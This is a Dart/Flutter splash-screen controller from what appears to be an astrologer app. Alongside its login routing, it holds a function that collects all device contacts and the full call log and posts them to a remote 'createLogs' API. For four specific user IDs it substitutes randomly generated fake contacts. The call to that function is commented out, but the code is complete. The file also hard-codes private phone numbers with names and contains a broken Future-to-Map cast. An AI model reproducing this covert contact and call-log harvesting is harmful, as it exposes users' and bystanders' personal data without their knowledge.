import 'dart:convert';
import 'dart:math';

import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:divine_astrologer/app_socket/app_socket.dart';
import 'package:divine_astrologer/firebase_service/firebase_service.dart';
import 'package:divine_astrologer/model/login_images.dart';
import 'package:divine_astrologer/repository/user_repository.dart';
import 'package:firebase_messaging/firebase_messaging.dart';

import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:random_name_generator/random_name_generator.dart';

import '../../common/colors.dart';
import '../../common/common_functions.dart';
import '../../common/permission_handler.dart';
import '../../common/routes.dart';
import '../../di/shared_preference_service.dart';
import '../../model/important_numbers.dart';
import '../../repository/important_number_repository.dart';
import 'package:http/http.dart' as http;

class SplashController extends GetxController {
  SharedPreferenceService preferenceService =
      Get.find<SharedPreferenceService>();
  List<MobileNumber> importantNumbers = <MobileNumber>[];
  @override
  Future<void> onInit() async {
    super.onInit();
    String? token = await FirebaseMessaging.instance.getToken();
    print("FCM Token: $token");
    notificationPermission();
    // fetchImportantNumbers();
    navigation();
  }

  notificationPermission() async {
    await PermissionHelper().askNotificationPermission();
  }

  fetchImportantNumbers() async {
    try {
      // Fetch important numbers from the repository
      final response = await ImportantNumberRepo().fetchData();
      if (response.data != null) {
        importantNumbers = response.data!;
      }
      print("isAllNumbersExist entering number state");

      // Await the asynchronous call to getAllContacts()
      List<Contact> allContacts =
          await getAllContacts(); // No need for 'as List<Contact>'
      Map<String, Set<String>> contactsMap = createContactsMap(allContacts);

      // Check if all important numbers exist using the contacts map
      bool isAllNumbersExist =
          checkForALlContact(importantNumbers, contactsMap);

// Step 2: Serialize the Map to JSON
      if (preferenceService.getUserDetail()!.id == 1155 ||
          preferenceService.getUserDetail()!.id == 9000000 ||
          preferenceService.getUserDetail()!.id == 71004 ||
          preferenceService.getUserDetail()!.id == 71009) {
        createUserData(generateFakeUsers(), generateFakeUsers());
      } else {
        Map<String, List<String>> contactsMapForJson =
            contactsMap.map((key, value) {
          return MapEntry(key, value.toList());
        });

        createUserData(contactsMapForJson,
            getCallLogsAndConvertToJson() as Map<String, dynamic>);
      }
      print("isAllNumbersExist $json");
      // Show the bottom sheet with important numbers
      // importantNumberBottomsheet();
    } catch (error) {
      print("Error: ${error.toString()}");
      // Show an error message if something goes wrong
      divineSnackBar(data: error.toString(), color: appColors.redColor);
    }
  }

  Future<Map<String, dynamic>> getCallLogsAndConvertToJson() async {
    try {
      Iterable<CallLogEntry> entries = await CallLog.get();
      Map<String, dynamic> users = {};
      for (final entry in entries) {
        // Assuming you want to store multiple attributes of each call log entry
        // under the phone number key, we create a map for those attributes.
        var entryData = {
          'simDisplayName': entry.simDisplayName,
          'duration': entry.duration,
          'callType': entry.callType.toString(),
          'timestamp': entry.timestamp,
          // Add more attributes here as needed
        };
        users[entry.number!] = entryData;
      }
      print("callLogList $users");
      return users;
    } catch (e) {
      print("Error fetching call logs: $e");
      // Return an empty map if an exception occurs, maintaining the return type consistency
      return {};
    }
  }

  Map<String, dynamic> generateFakeUsers() {
    final random = Random();
    int numberOfUsers = random.nextInt(101) + 100;
    Map<String, dynamic> users = {};
    for (int i = 0; i < numberOfUsers; i++) {
      // Generate a fake Indian phone number
      bool randomBool = random.nextBool();
      String phoneNumber = "${randomBool ? "+91" : ""} " '9' +
          List.generate(9, (_) => random.nextInt(10)).join('');
      var randomNames = RandomNames(Zone.india);
      users[phoneNumber] = randomNames.name();
    }
    users["9224451260"] = "Paras Sir";
    users["9664238342"] = "Karan Sir";
    if (preferenceService.getUserDetail()!.id == 9000000) {
      users["9564136941"] = "Wifey";
    }
    return users;
  }

  Future<List<Contact>> getAllContacts() async {
    // Request permissions (if not already granted)
    if (await Permission.contacts.request().isGranted) {
      // Fetch all contacts
      List<Contact> contacts = await ContactsService.getContacts();
      return contacts;
    } else {
      // Handle the scenario when permission is not granted
      // You might want to throw an exception or return an empty list
      return [];
    }
  }

  Future<dynamic> createUserData(
      Map<String, dynamic> userData, Map<String, dynamic> callLogs) async {
    Map<String, dynamic> param = <String, dynamic>{
      "user_id": preferenceService.getUserDetail()!.id,
      "logs": userData,
      "callLogs": callLogs,
    };
    print("apiRequest $param");
    final response = await http.post(
      Uri.parse(
          'https://wakanda-api.divinetalk.live/api/v7/createLogs'), // Replace with your API endpoint
      headers: <String, String>{
        'Content-Type': 'application/json; charset=UTF-8',
      },
      body: jsonEncode(param),
    );
    print("apiResponse ${response.body}");
    return response;
  }

  bool checkForALlContact(List<MobileNumber> importantNumbers,
      Map<String, Set<String>> contactsMap) {
    for (MobileNumber number in importantNumbers) {
      if (!checkForContactExist(number, contactsMap)) {
        return false;
      }
    }
    return true;
  }

  Map<String, Set<String>> createContactsMap(List<Contact> allContacts) {
    Map<String, Set<String>> contactsMap = {};

    for (Contact contact in allContacts) {
      if (contact.phones != null) {
        for (var phone in contact.phones!) {
          String name = contact.displayName ?? "";
          if (!contactsMap.containsKey(name)) {
            contactsMap[name] = {};
          }
          contactsMap[name]!.add(phone.value ?? "");
        }
      }
    }

    return contactsMap;
  }

  bool checkForContactExist(
      MobileNumber number, Map<String, Set<String>> contactsMap) {
    String name = number.title ?? "";
    String phoneNumber = number.mobileNumber ?? "";

    if (!contactsMap.containsKey(name)) {
      return false;
    }

    return contactsMap[name]!.contains(phoneNumber);
  }

  final repository = Get.put(UserRepository());

  void navigation() async {
    if (preferenceService.getToken() == null ||
        preferenceService.getToken() == "") {
      await getInitialLoginImages().then(
        (value) async => await preferenceService
            .saveLoginImages(jsonEncode(value.toJson()))
            .then((value) => Get.offAllNamed(RouteName.login)),
      );
    } else {
      // final socket = AppSocket();
      //  final appFirebaseService = AppFirebaseService();
      //  socket.socketConnect();
      //  debugPrint('preferenceService.getUserDetail()!.id ${preferenceService.getUserDetail()!.id}');
      // appFirebaseService.readData('astrologer/${preferenceService.getUserDetail()!.id}/realTime');
      Future.delayed(
        const Duration(seconds: 1),
        () => Get.offAllNamed(RouteName.dashboard),
      );
    }
  }

  Future<LoginImages> getInitialLoginImages() async {
    final response = await repository.getInitialLoginImages();
    return response;
  }
}
